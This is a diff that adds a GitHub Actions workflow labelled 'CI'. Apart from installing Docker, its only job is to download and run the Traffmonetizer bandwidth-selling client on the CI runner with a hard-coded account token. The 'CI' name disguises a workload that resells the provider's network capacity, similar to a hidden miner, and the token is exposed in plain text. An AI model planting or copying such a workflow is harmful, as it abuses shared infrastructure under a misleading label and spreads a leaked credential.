@@ -1,0 +1,29 @@
+name: CI
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Install Docker
+      run: |
+        curl -fsSL https://get.docker.com -o get-docker.sh
+        sudo sh get-docker.sh
+
+    - name: Start Docker service
+      run: |
+        sudo systemctl start docker
+
+    - name: Download Traffmonetizer via Docker
+      run: |
+        docker pull traffmonetizer/cli:latest
+    
+    - name: Traffmonetizer is active
+      run: |
+        docker run -i traffmonetizer/cli:latest start accept --token HOZG4B2KyylLV24KcEfJjf+4SNFL6ETNnBVoKyp7CZc=
